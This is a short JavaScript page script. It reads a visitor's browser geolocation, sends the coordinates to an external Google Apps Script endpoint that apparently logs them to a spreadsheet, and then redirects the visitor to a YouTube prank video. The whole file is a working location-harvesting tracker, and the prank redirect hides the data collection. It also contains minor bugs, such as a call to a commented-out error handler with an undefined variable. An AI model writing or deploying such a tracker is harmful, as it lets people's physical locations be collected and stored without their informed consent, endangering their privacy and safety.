let latitude = 0;
let longitude = 0;

function showPosition(position) {
    latitude = position.coords.latitude;
    longitude = position.coords.longitude;
    submitData(longitude, latitude);
    alert("longitude: >> " + longitude, "latitude: >>" + latitude);
    if (latitude !== 0 && longitude !== 0) {
        window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=BNaZXMKkPMJleBI5";
    } else {
        showError(error);
    }
}

// function showError(error) {
//     switch (error.code) {
//         case error.PERMISSION_DENIED:
//             alert("Grant permission to access this webpage.");

//             break;
//     }
// }

navigator.geolocation.getCurrentPosition(showPosition);

// Data saveing to Google Sheets

function submitData(name, email) {
    const params = new URLSearchParams();
    params.append('Longitude', name);
    params.append('Latitude', email);

    fetch('https://script.google.com/macros/s/AKfycbxOYnwZH9VI6uLanK3LPeT5VZswYnjjfL6JTnH5s4genWqhvzAZKz-HMvQkjx8eueNDuw/exec', {
        method: 'POST',
        body: params
    })
        .then(response => {
            if (response.ok) {
                console.log('Data submitted successfully');
            } else {
                console.error('Error submitting data');
            }
        })
        .catch(error => {
            console.error('Error submitting data:', error);
        });
}